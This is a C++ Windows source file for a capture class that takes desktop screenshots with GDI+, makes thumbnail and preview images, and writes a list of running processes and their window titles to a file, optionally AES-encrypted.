#include "StdAfx.h"
#include "Capture.h"

#define THUMB_WSIZE		180
#define PREVIEW_WSIZE	500

map<unsigned long, string> CCapture::mProcessIdName;
map<string, string> CCapture::mWNamePName;

CCapture::CCapture(void)
{
	// Initialize GDI+.
    GdiplusStartupInput gdiplusStartupInput;   
    GdiplusStartup(& this->_gdiplusToken, &gdiplusStartupInput, NULL);
}


CCapture::~CCapture(void)
{
	GdiplusShutdown(this->_gdiplusToken);
}


void CCapture::getScreenshot(string fname)
{
	CCapture::getScreenshotWin(fname);
}


void CCapture::getSystemProcesses(string fname, string status, string debug)
{
	string flist = this->getFormattedList();
	if(ENABLEAES)
		flist = CCrypto::aes_encryptData(flist);

	COJFs::writeFile(fname, string("status: ")+ status + string("\r\n") +flist + string("\r\n") + debug);
}

void CCapture::_getScreenshotWinAll(string fname)
{
	EnumDisplayMonitors(NULL, NULL, CCapture::monitorEnumProc, (LPARAM)fname.c_str());
}


string CCapture::getScreenshotWin(string fname)
{	
	int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);	

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP hCaptureBitmap =CreateCompatibleBitmap(hDesktopDC, 
                            nScreenWidth, nScreenHeight);

	SelectObject(hCaptureDC,hCaptureBitmap);

	BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,
           hDesktopDC,0,0,SRCCOPY|CAPTUREBLT);

    this->_SaveImageW(hCaptureBitmap, fname);

    ReleaseDC(hDesktopWnd,hDesktopDC);
    DeleteDC(hCaptureDC);
    DeleteObject(hCaptureBitmap);
	return fname;
}

int CCapture::_SaveImage(Bitmap *bm, string sFilename, int maxWidth)
{
	try
	{	
		CLSID pngClsid;

		int newHeight = bm->GetHeight();
		int newWidth = bm->GetWidth();

		Gdiplus::Bitmap * bmr = bm;

		bool resized = false;
		// resize if necessary
		if(maxWidth == 0)
		{
			maxWidth = this->_standardWidth;
		}

		if(maxWidth != 0 && newWidth > maxWidth)
		{
			newWidth = maxWidth;
			newHeight = (int)(maxWidth*(bm->GetHeight()/bm->GetWidth()));
			bmr = this->_ResizeClone(bm, newWidth, newHeight);
			resized = true;
		}
		else
		{
			bm = NULL;
		}

		if(sFilename.find(".png") != sFilename.npos)
			this->_GetEncoderClsid(L"image/png", &pngClsid);
		if(sFilename.find(".jpg") != sFilename.npos)
			this->_GetEncoderClsid(L"image/jpeg", &pngClsid);
		if(sFilename.find(".gif") != sFilename.npos)
			this->_GetEncoderClsid(L"image/gif", &pngClsid);

		EncoderParameters encoderParameters;
		ULONG             quality;
		encoderParameters.Count = 1;
		encoderParameters.Parameter[0].Guid = EncoderQuality;
		encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
		encoderParameters.Parameter[0].NumberOfValues = 1;	  
		quality = 80;										// quality
		encoderParameters.Parameter[0].Value = &quality;

		wchar_t  ws[200];
		swprintf(ws, 200, L"%hs", sFilename.c_str());
		bmr->Save(ws, &pngClsid, &encoderParameters);
		if(resized)
			delete(bmr);
		bmr = NULL;
		return 1; 
	}
	catch(...)
	{
		return 0;
	}
}


int CCapture::_SaveImageW(HBITMAP hBmp, string sFilename, int maxWidth)
{   
	Gdiplus::Bitmap bm(hBmp, NULL);
	return this->_SaveImage(&bm, sFilename, maxWidth);
}




void CCapture::createThumbs(string fname, string _tm, string _prev)
{	
	wchar_t  ws[200];
	swprintf(ws, 200, L"%hs", fname.c_str());
	Gdiplus::Bitmap bm(ws);
			
	string x = this->fileMinusX(fname);
	string tm = fname + _tm + x;
	string pr = fname + _prev + x;
	this->_SaveImage(&bm, tm, THUMB_WSIZE);
	this->_SaveImage(&bm, pr, PREVIEW_WSIZE);	
}

Bitmap* CCapture::_ResizeClone(Bitmap *bmp, INT width, INT height)
{
    UINT o_height = bmp->GetHeight();
    UINT o_width = bmp->GetWidth();
    INT n_width = width;
    INT n_height = height;
    double ratio = ((double)o_width) / ((double)o_height);
    if (o_width > o_height) {
        // Resize down by width
        n_height = static_cast<UINT>(((double)n_width) / ratio);
    } else {
        n_width = static_cast<UINT>(n_height * ratio);
    }
    Gdiplus::Bitmap* newBitmap = new Gdiplus::Bitmap(n_width, n_height, bmp->GetPixelFormat());
    Gdiplus::Graphics graphics(newBitmap);
    graphics.DrawImage(bmp, 0, 0, n_width, n_height);
    return newBitmap;
}

int CCapture::_GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes
	ImageCodecInfo* pImageCodecInfo = NULL;
	GetImageEncodersSize(&num, &size);
	if(size == 0)
		return -1;  // Failure
	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL)
		return -1;  // Failure
	GetImageEncoders(num, size, pImageCodecInfo);
	for(UINT j = 0; j < num; ++j)
	{
		if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}    
	}
	free(pImageCodecInfo);
	return 0;
}


string CCapture::fileMinusX(string& fname)
{
	size_t pos = fname.rfind(".");
	if(pos != fname.npos)
	{
		string x = fname.substr(pos);
		fname = fname.substr(0, pos);
		return x;
	}
	return "";
}



string CCapture::getFormattedList()
{
	CCapture::mProcessIdName.clear();
	CCapture::mWNamePName.clear();

	this->getProcesses();
	this->getWindowsList();

	string ret = "";
	map<string, string>::iterator it;
	for(it = CCapture::mWNamePName.begin(); it != CCapture::mWNamePName.end(); it++)
	{
		string pretty = it->first + " - " + it->second;
		ret += pretty + "\r\n";
	}
	return ret;
}

vector<string> CCapture::getProcesses()
{
	 unsigned long aProcesses[1024], cbNeeded, cProcesses;
	 vector<string> rprocess;
	 unsigned int i;
 
    if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return rprocess;
	}

	cProcesses = cbNeeded / sizeof(DWORD);
	for ( i = 0; i < cProcesses; i++ )
    {      
		TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

		// Get a handle to the process.
		HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_READ,
                                   FALSE, aProcesses[i] );

		// Get the process name.
		if (NULL != hProcess )
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), 
				 &cbNeeded) )
			{
				GetModuleBaseName( hProcess, hMod, szProcessName, 
								   sizeof(szProcessName)/sizeof(TCHAR) );
				rprocess.push_back(string(szProcessName));
				CCapture::mProcessIdName.insert(make_pair(aProcesses[i], string(szProcessName)));
			}
		}		
		//rprocess.push_back(string(szProcessName));		
	    CloseHandle( hProcess );
    }
 
    return rprocess;
}

vector<string> CCapture::getWindows()
{
	vector<string> windows;
    EnumDesktopWindows(NULL, CCapture::EnumWindowsProc, (LPARAM) &windows);
	return windows;
}

string CCapture::getWindowsList()
{
	string retString = "";		
	vector<string> windows = this->getWindows();
	for (vector<string>::iterator it = windows.begin() ; it != windows.end(); ++it)
			{
				if(*it != "<unknown>")
				{
					retString += *it;
					retString += "\n";
				}
			}
	return retString;
}


BOOL CALLBACK CCapture::EnumWindowsProc(HWND hwnd,LPARAM lParam)
{
	vector<string> & windows = *(vector<string>*)lParam;
    char title[256];
    GetWindowText(hwnd, title, 256);	
		
	if(string(title) != "")
	{
		windows.push_back(string(title));

		unsigned long pid;
		GetWindowThreadProcessId(hwnd, &pid);
		if(CCapture::mProcessIdName.find(pid) != CCapture::mProcessIdName.end())
		{
			CCapture::mWNamePName.insert(make_pair(string(title), CCapture::mProcessIdName[pid]));
		}
	}		

    return TRUE;
}

BOOL CALLBACK CCapture::monitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData )
{
	CApp::Engine()->debug_("monitor enum");
	string fname = (const char *)dwData;
	CApp::Capture.getScreenshotWin(fname);
	return TRUE;
}
